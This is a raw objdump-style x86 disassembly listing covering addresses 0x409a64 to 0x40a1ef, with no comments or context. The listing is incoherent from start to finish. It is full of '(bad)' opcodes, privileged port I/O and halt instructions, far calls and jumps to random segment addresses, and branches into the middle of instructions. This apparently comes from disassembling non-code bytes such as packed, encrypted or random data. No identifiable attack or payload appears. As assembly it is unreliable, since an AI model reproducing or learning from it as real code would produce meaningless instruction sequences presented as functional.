  409a64:	iret   
  409a65:	stc    
  409a66:	mov    edi,0x68d66534
  409a6b:	call   0x5c82:0x56e7bec2
  409a72:	cmc    
  409a73:	stos   DWORD PTR es:[edi],eax
  409a74:	mov    ds:0xe4a916c4,al
  409a79:	push   edi
  409a7a:	mov    bh,BYTE PTR [edi+edi*1]
  409a7d:	jns    0x409aad
  409a7f:	jb     0x409a6c
  409a81:	or     ch,ch
  409a83:	ror    eax,1
  409a85:	add    ah,BYTE PTR [ebp+0x6a]
  409a88:	cmp    eax,0x64094081
  409a8d:	jle    0x409af2
  409a8f:	shr    DWORD PTR [edi],0x9f
  409a92:	inc    edi
  409a93:	pop    edx
  409a94:	sti    
  409a95:	sbb    BYTE PTR [ecx],0x31
  409a98:	retf   
  409a99:	ret    0xbe58
  409a9c:	jge    0x409af1
  409a9e:	cs mov dh,0x4d
  409aa1:	fst    QWORD PTR [edi-0x5e]
  409aa4:	cdq    
  409aa5:	jno    0x409a55
  409aa7:	dec    esp
  409aa8:	pusha  
  409aa9:	outs   dx,DWORD PTR ds:[esi]
  409aaa:	sub    DWORD PTR ds:[esi-0x1214d690],edx
  409ab1:	inc    ebp
  409ab2:	iret   
  409ab3:	adc    eax,edi
  409ab5:	mov    dl,ah
  409ab7:	pusha  
  409ab8:	ins    DWORD PTR es:[edi],dx
  409ab9:	out    0xa1,al
  409abb:	jmp    0x7afe:0x21f40b72
  409ac2:	or     bh,ah
  409ac4:	(bad)  
  409ac6:	xchg   ebp,eax
  409ac7:	sbb    eax,0xb09c00d4
  409acc:	retf   0x39c4
  409acf:	sar    DWORD PTR [esi],1
  409ad1:	aad    0x7c
  409ad3:	mov    al,0x8e
  409ad5:	imul   edx,DWORD PTR [esp+edx*4-0x6213c983],0x65
  409add:	push   es
  409ade:	ss loope 0x409ab1
  409ae1:	or     edi,ebx
  409ae3:	or     esp,ecx
  409ae5:	imul   ecx,DWORD PTR [ecx-0x4e1b2269],0xffffffaf
  409aec:	ds loop 0x409a89
  409aef:	fdiv   st(4),st
  409af1:	icebp  
  409af2:	jne    0x409b6a
  409af4:	jno    0x409ae9
  409af6:	fbld   TBYTE PTR [eax+0x600e1119]
  409afc:	xor    cl,bh
  409afe:	pop    ebx
  409aff:	pop    edx
  409b00:	jecxz  0x409b5d
  409b02:	fwait
  409b03:	inc    eax
  409b04:	pop    ecx
  409b05:	leave  
  409b06:	ins    DWORD PTR es:[edi],dx
  409b07:	xchg   edx,eax
  409b08:	adc    DWORD PTR [esi+edi*1-0x7a8b4646],eax
  409b0f:	call   0x7e68:0xf5afc3b6
  409b16:	xor    bl,al
  409b18:	sub    al,0x23
  409b1a:	test   al,0xa2
  409b1c:	mov    dl,BYTE PTR [esi+eiz*2-0x7c76a2a3]
  409b23:	mov    esp,0xa22c6d15
  409b28:	xchg   ebp,eax
  409b29:	das    
  409b2a:	psllq  mm4,mm3
  409b2d:	sbb    ebx,DWORD PTR [eax+0xa]
  409b30:	sub    DWORD PTR [edi-0x5f],ecx
  409b33:	js     0x409bb1
  409b35:	inc    ebp
  409b36:	dec    esi
  409b37:	lahf   
  409b38:	xchg   ebx,eax
  409b39:	arpl   WORD PTR [ecx],si
  409b3b:	xchg   ecx,eax
  409b3c:	shl    DWORD PTR [ebp-0x6fed0864],1
  409b42:	lfs    esp,FWORD PTR ds:0x6183856c
  409b49:	inc    ecx
  409b4a:	or     eax,0xe16af0cc
  409b4f:	inc    DWORD PTR [ebx]
  409b51:	leave  
  409b52:	mov    bl,BYTE PTR [ecx+ecx*4-0x4080dd36]
  409b59:	icebp  
  409b5a:	xchg   ecx,eax
  409b5b:	rol    BYTE PTR [ebx+ebp*4-0x12],cl
  409b5f:	int    0xb1
  409b61:	jbe    0x409b58
  409b63:	and    BYTE PTR [edi+0x36576044],dl
  409b69:	sub    edx,ebp
  409b6b:	dec    ebp
  409b6c:	add    DWORD PTR [esi+eiz*2+0x52851023],edx
  409b73:	xor    al,0x90
  409b75:	pop    ebp
  409b76:	xchg   DWORD PTR [ebx],ecx
  409b78:	scas   eax,DWORD PTR es:[edi]
  409b79:	mov    dh,0x89
  409b7b:	pop    ebp
  409b7c:	adc    DWORD PTR [ebx-0x50],eax
  409b7f:	(bad)  
  409b80:	fs jnp 0x409bf7
  409b83:	push   cs
  409b84:	push   0x9da9d936
  409b89:	cmp    dl,BYTE PTR [edi]
  409b8b:	ins    DWORD PTR es:[edi],dx
  409b8c:	dec    edx
  409b8d:	sub    DWORD PTR [ebx],0x70074a2f
  409b93:	icebp  
  409b94:	idiv   BYTE PTR [eax+ecx*2]
  409b97:	xor    esp,edi
  409b99:	fcmovne st,st(7)
  409b9b:	push   esi
  409b9c:	push   esi
  409b9d:	imul   esp,ebx,0x5d
  409ba0:	jbe    0x409bd8
  409ba2:	loop   0x409bb7
  409ba4:	or     eax,0xba4784e8
  409ba9:	je     0x409bf1
  409bab:	mov    ecx,0x9d89b417
  409bb0:	xor    al,0xa2
  409bb2:	jle    0x409b71
  409bb4:	fisub  DWORD PTR [edx+ecx*2+0xb]
  409bb8:	cli    
  409bb9:	out    dx,eax
  409bba:	(bad)  
  409bbb:	je     0x409bc5
  409bbd:	fs adc esp,edx
  409bc0:	pop    edi
  409bc1:	bswap  esp
  409bc3:	mov    esi,0xe30357ca
  409bc8:	mov    ch,0xa6
  409bca:	cmc    
  409bcb:	(bad)  
  409bcc:	int    0xc4
  409bce:	mov    dl,0x8d
  409bd0:	iret   
  409bd1:	fwait
  409bd2:	mov    ds:0x8cf8b776,al
  409bd7:	ret    0xc9e3
  409bda:	shl    BYTE PTR [ebx+0x70],1
  409bdd:	les    esi,FWORD PTR [esi+0x52]
  409be0:	dec    esi
  409be1:	repz fxch st(0)
  409be4:	dec    ebp
  409be5:	shl    DWORD PTR [edi+0x86a2296],1
  409beb:	mov    BYTE PTR [ebx],ch
  409bed:	mov    edx,0x134392f7
  409bf2:	push   esp
  409bf3:	stos   DWORD PTR es:[edi],eax
  409bf4:	inc    ebx
  409bf5:	or     DWORD PTR [ebx+0x56f4b971],eax
  409bfb:	push   ss
  409bfc:	xchg   ebp,eax
  409bfd:	mov    ds:0x5c06c2e1,al
  409c02:	scas   al,BYTE PTR es:[edi]
  409c03:	sbb    esp,DWORD PTR [ecx+0x35a5c68]
  409c09:	shr    DWORD PTR [eax],1
  409c0b:	and    ebp,DWORD PTR [ebx-0x6c]
  409c0e:	inc    ebx
  409c0f:	(bad)  
  409c10:	cwde   
  409c11:	adc    BYTE PTR [esi+ebx*4+0x69],ah
  409c15:	xor    eax,0xfdf840aa
  409c1a:	mov    ecx,0x56260c67
  409c1f:	mov    eax,ds:0xa19ef7a0
  409c24:	fisubr WORD PTR [ebx-0x2]
  409c27:	(bad)  
  409c28:	or     eax,0xf41fbdbb
  409c2d:	sbb    BYTE PTR [ebx-0x563d90e1],bl
  409c33:	push   esi
  409c34:	dec    ecx
  409c35:	mov    eax,0xf3720b09
  409c3a:	outs   dx,BYTE PTR ds:[esi]
  409c3b:	imul   eax,DWORD PTR [ecx],0x511c5849
  409c41:	or     bl,ah
  409c43:	cld    
  409c44:	mov    ah,al
  409c46:	xchg   cl,dh
  409c48:	add    BYTE PTR [eax+0x1a],dh
  409c4b:	enter  0xf204,0x47
  409c4f:	pushf  
  409c50:	mov    bh,0x7
  409c52:	sub    al,0x77
  409c54:	mov    eax,0xf7b7182d
  409c59:	loopne 0x409c59
  409c5b:	lods   al,BYTE PTR ds:[esi]
  409c5d:	mov    al,ds:0x7d15f42
  409c62:	mov    DWORD PTR [eax+0x1fc664d3],ebp
  409c68:	(bad)  [edx]
  409c6a:	stos   BYTE PTR es:[edi],al
  409c6b:	push   ss
  409c6c:	hlt    
  409c6d:	dec    esi
  409c6e:	sub    bh,BYTE PTR [esp+esi*8+0x4d83846a]
  409c75:	ror    ebx,0x58
  409c78:	int    0x3f
  409c7a:	xchg   ebp,eax
  409c7b:	push   eax
  409c7c:	cmp    bl,BYTE PTR [esi+0x19]
  409c7f:	fimul  DWORD PTR [eax]
  409c81:	outs   dx,DWORD PTR ds:[esi]
  409c82:	(bad)  
  409c83:	fld    QWORD PTR [ebp+0x3e]
  409c86:	popa   
  409c87:	fistp  WORD PTR [esi]
  409c89:	cmp    BYTE PTR [esi-0x70],0x22
  409c8d:	mov    ah,0xa9
  409c8f:	or     eax,0x5494d2a8
  409c94:	push   ds
  409c95:	rcr    edx,0x7f
  409c98:	push   ss
  409c99:	lds    ebp,FWORD PTR [edx]
  409c9b:	bound  ebp,QWORD PTR [ebp-0x29]
  409c9e:	loope  0x409cca
  409ca0:	or     eax,DWORD PTR [edx+eiz*8-0x33]
  409ca4:	xor    ecx,esi
  409ca6:	cmp    eax,edx
  409ca8:	fmul   DWORD PTR [esp+ebx*2-0x71]
  409cac:	out    0xc3,al
  409cae:	mov    bl,0xd
  409cb0:	call   0x367038cf
  409cb5:	cdq    
  409cb6:	repz pop esi
  409cb8:	enter  0xa018,0xd0
  409cbc:	push   cs
  409cbd:	jg     0x409c63
  409cbf:	inc    esi
  409cc0:	(bad)  
  409cc1:	jns    0x409ce7
  409cc3:	clc    
  409cc4:	xor    BYTE PTR [ebx+0x7004930],bh
  409cca:	mov    BYTE PTR [ebx+0x62],bh
  409ccd:	cmp    eax,0x61761d2e
  409cd2:	add    eax,0xbe340264
  409cd7:	retf   
  409cd8:	pop    edi
  409cd9:	jmp    0xdc9f:0x6091c6cb
  409ce0:	jl     0x409d1f
  409ce2:	dec    ebx
  409ce3:	add    dl,dh
  409ce5:	xor    al,0xfa
  409ce7:	add    BYTE PTR [ebx+0x5f1e41bb],0x5b
  409cee:	daa    
  409cef:	xchg   eax,ecx
  409cf1:	in     al,0xd2
  409cf3:	test   BYTE PTR [eax-0x2c],ch
  409cf6:	fnsave [edx]
  409cf8:	adc    DWORD PTR [esi-0x6a],0x5e
  409cfc:	fnsave [esi-0x55]
  409cff:	mov    al,0x8e
  409d01:	xchg   ebx,eax
  409d02:	rcl    BYTE PTR [ecx+0x4b],cl
  409d05:	outs   dx,DWORD PTR ds:[esi]
  409d06:	dec    eax
  409d07:	mov    esp,gs
  409d09:	push   cs
  409d0a:	pushf  
  409d0b:	mov    al,ds:0x7806df3a
  409d10:	into   
  409d11:	mov    esi,0x92603712
  409d16:	neg    dl
  409d18:	rcl    DWORD PTR [esi-0x62320257],0x0
  409d1f:	pop    eax
  409d20:	sbb    al,0xf8
  409d22:	addr16 jg 0x409d30
  409d25:	mov    ebp,0x32e977a7
  409d2a:	hlt    
  409d2b:	mov    edi,0x315a021d
  409d30:	add    eax,0x9951c5f5
  409d35:	mov    al,ds:0x9be06ea5
  409d3a:	mov    esi,0x5517a241
  409d3f:	or     bh,0x43
  409d42:	ror    BYTE PTR [eax-0x1a],1
  409d45:	out    0x4e,eax
  409d47:	js     0x409cf0
  409d49:	and    al,0x81
  409d4b:	or     eax,0xe5b94f46
  409d50:	jle    0x409d15
  409d52:	repnz icebp 
  409d54:	xlat   BYTE PTR ds:[ebx]
  409d55:	arpl   WORD PTR [edi+eiz*2+0xd],bx
  409d59:	addr16 mov ch,0xc3
  409d5c:	adc    DWORD PTR [edi-0x19],ebx
  409d5f:	jecxz  0x409ce4
  409d61:	imul   ecx,edx,0xe693891
  409d67:	jl     0x409d19
  409d69:	pop    ss
  409d6a:	xchg   ecx,eax
  409d6b:	push   0x3590d433
  409d70:	cmp    BYTE PTR [ebx],dh
  409d72:	jp     0x409dbc
  409d74:	jecxz  0x409def
  409d76:	dec    edi
  409d77:	std    
  409d78:	xchg   ebp,eax
  409d79:	enter  0x9ddb,0x8f
  409d7d:	jl     0x409d3d
  409d7f:	add    dl,BYTE PTR [eax]
  409d81:	or     al,0x83
  409d83:	add    eax,0x392968f2
  409d88:	cmc    
  409d89:	adc    esp,DWORD PTR ss:[esi]
  409d8c:	addr16 pop ss
  409d8e:	inc    ebp
  409d8f:	adc    ah,BYTE PTR [ebp+0x3a]
  409d92:	pop    ebp
  409d93:	call   0xfe2f77ba
  409d98:	xor    DWORD PTR [ebx+0x55],edx
  409d9b:	(bad)  
  409d9c:	test   BYTE PTR [edi],ah
  409d9e:	pop    ebp
  409d9f:	adc    cl,BYTE PTR ds:0x406fea8d
  409da5:	xor    eax,0x97e17dab
  409daa:	inc    edi
  409dab:	cdq    
  409dac:	sbb    al,0xe1
  409dae:	pushf  
  409daf:	cmp    DWORD PTR [esi+0x54],edi
  409db2:	int    0x6b
  409db4:	dec    edi
  409db5:	gs xchg edx,eax
  409db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db8:	cli    
  409db9:	popa   
  409dba:	xchg   ebx,eax
  409dbb:	mov    ds:0x95265549,eax
  409dc0:	adc    eax,0xf43a52ab
  409dc5:	popf   
  409dc6:	(bad)  
  409dc7:	push   eax
  409dc8:	mov    ds:0xcf2db008,eax
  409dcd:	mov    ebp,0xf7c6cb2e
  409dd2:	adc    ebx,esp
  409dd4:	(bad)  
  409dd5:	cmp    al,0x96
  409dd7:	sti    
  409dd8:	outs   dx,BYTE PTR ds:[esi]
  409dd9:	ins    BYTE PTR es:[edi],dx
  409dda:	dec    ebx
  409ddb:	mov    fs,ebp
  409ddd:	mov    edi,0xafd0b067
  409de2:	imul   BYTE PTR [esi-0x30]
  409de5:	push   edx
  409de6:	leave  
  409de7:	xchg   ebp,eax
  409de8:	stos   BYTE PTR es:[edi],al
  409de9:	mov    ebp,0xc1874c6e
  409dee:	mov    ebx,0x706789cd
  409df3:	add    eax,0x9f6c3e0c
  409df8:	daa    
  409df9:	push   0x78
  409dfb:	add    al,0x5a
  409dfd:	dec    esp
  409dfe:	test   DWORD PTR [ebx+0x4e],edx
  409e01:	inc    edx
  409e02:	pop    edi
  409e03:	mov    bl,0x74
  409e05:	in     eax,0xc3
  409e07:	cmp    eax,0x25026fb3
  409e0c:	xchg   edi,eax
  409e0d:	bound  esp,QWORD PTR [eax-0x10]
  409e10:	xor    DWORD PTR [esp+eax*1],edx
  409e13:	hlt    
  409e14:	ins    BYTE PTR es:[edi],dx
  409e15:	jl     0x409e8b
  409e17:	add    eax,0xf4629ed9
  409e1c:	stc    
  409e1d:	ins    DWORD PTR es:[edi],dx
  409e1e:	das    
  409e1f:	and    DWORD PTR [edx],0xbdee055
  409e25:	mov    cx,0x1724
  409e29:	pop    edi
  409e2a:	pushf  
  409e2b:	aas    
  409e2c:	nop
  409e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e2e:	dec    ebp
  409e2f:	pop    esp
  409e30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e31:	inc    esi
  409e32:	and    BYTE PTR [esi-0x4ac27d33],al
  409e38:	iret   
  409e39:	neg    BYTE PTR [esi+0x38]
  409e3c:	(bad)  
  409e3d:	jns    0x409ddf
  409e3f:	sub    DWORD PTR [edx-0x68],0xc8638d90
  409e46:	shl    BYTE PTR [edx+0x26760bca],1
  409e4c:	pop    ds
  409e4d:	cmp    ebx,edx
  409e4f:	in     al,dx
  409e50:	mov    esi,0x63285155
  409e55:	add    al,0x6e
  409e57:	jbe    0x409e3b
  409e59:	jne    0x409e43
  409e5b:	mov    bl,bh
  409e5d:	mov    ch,0x7f
  409e5f:	mul    dh
  409e61:	pop    edx
  409e62:	(bad)  
  409e64:	dec    eax
  409e65:	mov    al,0xcd
  409e67:	xor    DWORD PTR ds:0xe7e215b3,ebx
  409e6d:	scas   eax,DWORD PTR es:[edi]
  409e6e:	add    eax,0x91736c57
  409e73:	mov    dh,0x46
  409e75:	push   ss
  409e76:	add    ecx,DWORD PTR [eax+0xd0587ac]
  409e7c:	adc    al,0x6c
  409e7e:	adc    dh,cl
  409e80:	jmp    0x920:0x36c3faff
  409e87:	xchg   ecx,eax
  409e88:	xchg   ecx,eax
  409e89:	les    esi,FWORD PTR [esi-0x54]
  409e8c:	(bad)  
  409e8d:	pop    es
  409e8e:	mov    dh,0x2f
  409e90:	lea    ebx,[ecx*2-0x5b0d5eda]
  409e97:	inc    ebp
  409e98:	mov    eax,0xb7be7b5c
  409e9d:	sub    eax,DWORD PTR [esi+0x24]
  409ea0:	pop    ebp
  409ea1:	mov    cl,0xe7
  409ea3:	inc    ebp
  409ea4:	aad    0xa3
  409ea6:	pop    edx
  409ea7:	aam    0x60
  409ea9:	ja     0x409e38
  409eab:	call   0x7147088a
  409eb0:	cmc    
  409eb1:	test   al,0xcf
  409eb3:	jo     0x409e78
  409eb5:	out    dx,al
  409eb6:	jns    0x409e6a
  409eb8:	not    DWORD PTR [edx-0x76]
  409ebb:	add    BYTE PTR [esi-0x3214975c],ch
  409ec1:	jge    0x409f23
  409ec3:	inc    edx
  409ec4:	pop    ecx
  409ec5:	add    ah,BYTE PTR [ebp+0x7bdd755d]
  409ecb:	inc    esp
  409ecc:	inc    esp
  409ecd:	add    al,0xd
  409ecf:	bound  eax,QWORD PTR [ebx-0x60]
  409ed2:	add    bh,0xf5
  409ed5:	icebp  
  409ed6:	cwde   
  409ed7:	cmp    cl,BYTE PTR [ecx-0x5d]
  409eda:	xchg   BYTE PTR [ebp+0x3d002b53],dl
  409ee0:	retf   
  409ee1:	int3   
  409ee2:	adc    eax,0x356dc542
  409ee7:	push   es
  409ee8:	pusha  
  409ee9:	dec    eax
  409eea:	fdiv   DWORD PTR [ebp+0x7e]
  409eed:	pop    edi
  409eee:	lahf   
  409eef:	(bad)  
  409ef0:	sbb    bh,BYTE PTR ds:[edx+0x5c]
  409ef4:	aas    
  409ef5:	inc    BYTE PTR [edi]
  409ef7:	scas   eax,DWORD PTR es:[edi]
  409ef8:	mov    bh,0x11
  409efa:	mov    ds:0x4c864649,eax
  409eff:	jecxz  0x409ed5
  409f01:	iret   
  409f02:	pushf  
  409f03:	lock cmp DWORD PTR [ebx],ebp
  409f06:	jnp    0x409ec4
  409f08:	hlt    
  409f09:	jae    0x409f88
  409f0b:	cdq    
  409f0c:	sahf   
  409f0d:	pop    esi
  409f0e:	mov    ch,0xb
  409f10:	call   0x5b3210ae
  409f15:	(bad)  
  409f16:	rcr    DWORD PTR [esi-0x79],1
  409f19:	arpl   WORD PTR [ebp-0x56],cx
  409f1c:	inc    edx
  409f1d:	mov    al,0xe6
  409f1f:	jno    0x409f46
  409f21:	call   FWORD PTR [edi]
  409f23:	pop    ds
  409f24:	ds clc 
  409f26:	daa    
  409f27:	cmp    DWORD PTR [eax-0x669e849a],eax
  409f2d:	out    dx,eax
  409f2e:	scas   al,BYTE PTR es:[edi]
  409f2f:	outs   dx,BYTE PTR ds:[esi]
  409f30:	sub    DWORD PTR [ecx],edi
  409f32:	inc    edx
  409f33:	outs   dx,DWORD PTR ds:[esi]
  409f34:	xchg   edi,eax
  409f35:	out    dx,eax
  409f36:	cdq    
  409f37:	push   es
  409f38:	std    
  409f39:	ins    BYTE PTR es:[edi],dx
  409f3a:	sti    
  409f3b:	jg     0x409edb
  409f3d:	jecxz  0x409f11
  409f3f:	cmp    ebx,edi
  409f41:	in     al,0xe4
  409f43:	push   edx
  409f44:	dec    eax
  409f45:	add    eax,0xf336b466
  409f4a:	shl    dl,0xcf
  409f4d:	leave  
  409f4e:	cmp    BYTE PTR [edx],bl
  409f50:	test   DWORD PTR [edx-0x42],edi
  409f53:	dec    ecx
  409f54:	jne    0x409f16
  409f56:	pop    esi
  409f57:	dec    esi
  409f58:	leave  
  409f59:	push   edi
  409f5a:	pop    edi
  409f5b:	and    edi,DWORD PTR [esi+0x226cc89b]
  409f61:	popf   
  409f62:	sub    edi,esp
  409f64:	scas   eax,DWORD PTR es:[edi]
  409f65:	or     ebx,ecx
  409f67:	xchg   ebp,eax
  409f68:	in     eax,dx
  409f69:	xchg   ebp,eax
  409f6a:	sbb    esi,0x3fb8c92d
  409f70:	and    al,0x80
  409f72:	call   0x1757ee23
  409f77:	fmul   QWORD PTR [eax]
  409f79:	stc    
  409f7a:	jp     0x409f4b
  409f7c:	and    DWORD PTR [edi+0x4859f518],ebx
  409f82:	xchg   esp,eax
  409f84:	retf   0xb8cd
  409f87:	mov    dl,0xaa
  409f89:	cli    
  409f8a:	xchg   ecx,eax
  409f8b:	mov    dh,BYTE PTR [ecx-0x30f6b1a7]
  409f91:	repnz rol DWORD PTR [eax-0x7a8d539c],0xc
  409f99:	cmp    ebp,DWORD PTR [eax+0x6b]
  409f9c:	inc    edx
  409f9d:	shr    BYTE PTR [esi+0x2ec73982],cl
  409fa3:	xchg   ebx,eax
  409fa4:	sub    BYTE PTR [eax+edx*8+0x30],dl
  409fa8:	mov    BYTE PTR [ebx+0x69a62767],dl
  409fae:	jp     0x409f88
  409fb0:	ror    DWORD PTR [ebx+0x6],1
  409fb3:	arpl   WORD PTR [edx],di
  409fb5:	push   ebx
  409fb6:	hlt    
  409fb7:	inc    edi
  409fb8:	test   al,0x10
  409fba:	jo     0x409f97
  409fbc:	push   esp
  409fbd:	lods   al,BYTE PTR ds:[esi]
  409fbe:	icebp  
  409fbf:	rol    DWORD PTR [esi+0x4b7700b],0xd9
  409fc6:	sub    edx,DWORD PTR [ebx]
  409fc8:	and    al,0x78
  409fca:	mov    dh,0x90
  409fcc:	lods   eax,DWORD PTR ds:[esi]
  409fcd:	xor    al,0x6d
  409fcf:	ins    BYTE PTR es:[edi],dx
  409fd0:	lahf   
  409fd1:	std    
  409fd2:	mov    edx,0x59d5a095
  409fd7:	call   0xc1343278
  409fdc:	out    dx,eax
  409fdd:	fdivr  DWORD PTR [ecx]
  409fdf:	jge    0x40a019
  409fe1:	rcr    ecx,0xaa
  409fe4:	movq   mm4,QWORD PTR [edx+0x50]
  409fe8:	call   0x67e734dc
  409fed:	(bad)
  409ff1:	and    eax,0xd9a25d3f
  409ff6:	sub    DWORD PTR [edi-0x3d011f5e],ebx
  409ffc:	jno    0x40a04a
  409ffe:	pushf  
  409fff:	adc    al,0x5
  40a001:	sar    DWORD PTR [eax+0x52],cl
  40a004:	lods   al,BYTE PTR ds:[esi]
  40a005:	sti    
  40a006:	jmp    0x409f9c
  40a008:	leave  
  40a009:	push   ds
  40a00a:	js     0x409fcc
  40a00c:	fcmovnbe st,st(5)
  40a00e:	dec    esp
  40a00f:	bound  ecx,QWORD PTR [eax-0x70]
  40a012:	sar    edi,0x16
  40a015:	cmp    eax,0xc0b17016
  40a01a:	fisttp WORD PTR [edx-0xc4ba199]
  40a020:	(bad)  
  40a021:	or     eax,0x539142ca
  40a026:	sbb    eax,0xf8f24e39
  40a02b:	(bad)  
  40a02d:	jp     0x40a021
  40a02f:	out    dx,al
  40a030:	push   edx
  40a031:	ss je  0x409fe8
  40a034:	in     eax,dx
  40a035:	push   eax
  40a036:	sub    eax,0xb304a384
  40a03b:	pop    es
  40a03c:	pop    edx
  40a03d:	ss arpl WORD PTR gs:[esi],ax
  40a041:	stos   BYTE PTR es:[edi],al
  40a042:	mov    WORD PTR [edx-0x67a11e5d],ss
  40a048:	shr    DWORD PTR [edx-0x128fe632],cl
  40a04e:	scas   al,BYTE PTR es:[edi]
  40a04f:	sub    dh,BYTE PTR [ecx+0x3b]
  40a052:	cmp    al,0x22
  40a054:	or     BYTE PTR [ebx-0x36],0xd5
  40a058:	jnp    0x40a044
  40a05a:	xchg   esp,eax
  40a05b:	cmc    
  40a05c:	and    al,0xeb
  40a05e:	(bad)  
  40a060:	xor    DWORD PTR [esi-0x41],ebx
  40a063:	test   DWORD PTR [esi+0x3e44e375],edx
  40a069:	adc    DWORD PTR [ebx+0x4c],ecx
  40a06c:	pop    ds
  40a06d:	push   cs
  40a06e:	jno    0x40a0cf
  40a070:	mov    eax,0xc747a2dc
  40a075:	mov    ds:0xf04cfde1,eax
  40a07a:	mov    ah,0x7d
  40a07c:	adc    BYTE PTR [eax-0x7045e5e3],dh
  40a082:	icebp  
  40a083:	jb     0x40a0fc
  40a085:	mov    ebp,0x42f6fea9
  40a08a:	inc    ecx
  40a08b:	ficom  WORD PTR [ecx]
  40a08d:	jecxz  0x40a0e5
  40a08f:	imul   ecx,DWORD PTR [bx+di+0x294],0xdc57a1f3
  40a098:	out    dx,eax
  40a099:	arpl   WORD PTR [ebx+0x48],di
  40a09c:	jno    0x40a116
  40a09e:	and    bh,BYTE PTR [eax-0x34d9bd73]
  40a0a4:	iret   
  40a0a5:	fdiv   DWORD PTR [ebx+edx*8+0x18]
  40a0a9:	(bad)  
  40a0aa:	loop   0x40a10e
  40a0ac:	jno    0x40a098
  40a0ae:	xor    al,BYTE PTR [esi]
  40a0b0:	dec    edx
  40a0b1:	adc    ebx,DWORD PTR [esp+ebx*4-0x5c0cea7e]
  40a0b8:	ja     0x40a0d0
  40a0ba:	clc    
  40a0bb:	sbb    DWORD PTR [ebp-0x71],esi
  40a0be:	pop    ecx
  40a0bf:	lds    esp,FWORD PTR [esi-0x32]
  40a0c2:	push   ds
  40a0c3:	or     dh,BYTE PTR [edi+0x5f]
  40a0c6:	js     0x40a128
  40a0c8:	mov    dh,BYTE PTR [eiz*4-0x2e25b4b0]
  40a0cf:	and    dh,BYTE PTR [esi]
  40a0d1:	jnp    0x40a0a4
  40a0d3:	mov    esi,0x8ddd6b3a
  40a0d8:	jmp    0xa0c7:0x8f3b3725
  40a0df:	inc    ecx
  40a0e0:	pop    ecx
  40a0e1:	jne    0x40a14e
  40a0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0e4:	push   0xffffff94
  40a0e6:	scas   eax,DWORD PTR es:[edi]
  40a0e7:	sahf   
  40a0e8:	cwde   
  40a0e9:	lock jns 0x40a0c4
  40a0ec:	xor    eax,0x117dfd7b
  40a0f1:	dec    ebp
  40a0f2:	jo     0x40a0b4
  40a0f4:	xor    eax,0x320c0470
  40a0f9:	push   edi
  40a0fa:	shr    BYTE PTR [edi],1
  40a0fc:	retf   
  40a0fd:	fmul   DWORD PTR [ebx-0xfe0ffec]
  40a103:	push   0x7dba05ce
  40a108:	ins    BYTE PTR es:[edi],dx
  40a109:	in     eax,dx
  40a10a:	sbb    al,0x87
  40a10c:	stc    
  40a10d:	out    dx,al
  40a10e:	xor    ch,BYTE PTR [edi-0x5d]
  40a111:	outs   dx,BYTE PTR ds:[si]
  40a113:	ret    
  40a114:	aas    
  40a115:	cmp    cl,BYTE PTR [edi]
  40a117:	(bad)
  40a11a:	mov    ecx,DWORD PTR [esp+edx*1]
  40a11d:	inc    ebx
  40a11e:	jns    0x40a10d
  40a120:	jle    0x40a111
  40a122:	cmp    eax,0xf06ad3c9
  40a127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a128:	das    
  40a129:	fs popf 
  40a12b:	stc    
  40a12c:	shr    DWORD PTR [esi],1
  40a12e:	popf   
  40a12f:	fnstenv [eax]
  40a131:	push   ebp
  40a132:	int3   
  40a133:	mov    edx,DWORD PTR [ecx+ecx*8+0x2f]
  40a137:	adc    DWORD PTR [eax-0x40],0x25
  40a13b:	jne    0x40a172
  40a13d:	into   
  40a13e:	xor    DWORD PTR [ebp+0x54b51ec6],eax
  40a144:	fdivr  QWORD PTR [ebx-0x55]
  40a147:	into   
  40a148:	mov    ds:0x3ca2ab,al
  40a14d:	xor    cl,BYTE PTR [edx-0x31]
  40a150:	retf   
  40a151:	mov    ch,0x19
  40a153:	push   ss
  40a154:	clc    
  40a155:	arpl   ax,dx
  40a157:	ds jge 0x40a160
  40a15a:	adc    DWORD PTR [ecx+0x73],edi
  40a15d:	std    
  40a15e:	push   cs
  40a15f:	lods   al,BYTE PTR ds:[esi]
  40a160:	mov    esp,0x4aac595e
  40a165:	cli    
  40a166:	adc    ebx,0x1
  40a169:	xor    DWORD PTR [esi+edx*2-0x72],0x6e
  40a16e:	inc    ebx
  40a16f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a170:	shl    DWORD PTR [ebx+ebp*2+0x377782c3],1
  40a177:	mov    ds:0x9dd72486,eax
  40a17c:	and    DWORD PTR [ecx+0x137aac57],eax
  40a182:	aas    
  40a183:	xchg   ebx,eax
  40a184:	lahf   
  40a185:	mov    bh,0x5a
  40a187:	xchg   DWORD PTR [esi-0x2262c001],esp
  40a18d:	retf   0x3606
  40a190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a191:	and    dh,BYTE PTR [eax-0x5f]
  40a194:	repz in al,dx
  40a196:	mov    bh,cl
  40a198:	or     eax,0x7d8e66b7
  40a19d:	sti    
  40a19e:	dec    esp
  40a19f:	inc    esp
  40a1a0:	xor    BYTE PTR [eax],0x78
  40a1a3:	mov    dl,0xb5
  40a1a5:	add    ebp,ebx
  40a1a7:	out    dx,al
  40a1a8:	fdivr  DWORD PTR [esi+0x3a]
  40a1ab:	dec    edi
  40a1ac:	jl     0x40a218
  40a1ae:	cld    
  40a1af:	cs pop esi
  40a1b1:	push   DWORD PTR [eax-0x17]
  40a1b4:	sbb    eax,0xa157567
  40a1b9:	sub    al,BYTE PTR [esi]
  40a1bb:	jmp    0x4c667831
  40a1c0:	push   cs
  40a1c1:	xor    eax,0xd0e1f5f4
  40a1c6:	mov    cl,BYTE PTR [eax+0x27]
  40a1c9:	test   al,0x84
  40a1cb:	hlt    
  40a1cc:	mov    al,0x62
  40a1ce:	xchg   esp,eax
  40a1cf:	int    0x13
  40a1d1:	cmp    al,0x70
  40a1d3:	jo     0x40a1c9
  40a1d5:	lock fistp DWORD PTR [edx+edx*2+0x23]
  40a1da:	rcl    al,cl
  40a1dc:	retf   0x2850
  40a1df:	mov    BYTE PTR ds:0x45356a3a,bl
  40a1e5:	enter  0xeca7,0x4d
  40a1e9:	retf   0xe647
  40a1ec:	xchg   esp,eax
  40a1ed:	cmp    bl,bh
  40a1ef:	mov    eax,0xbda3aa5e
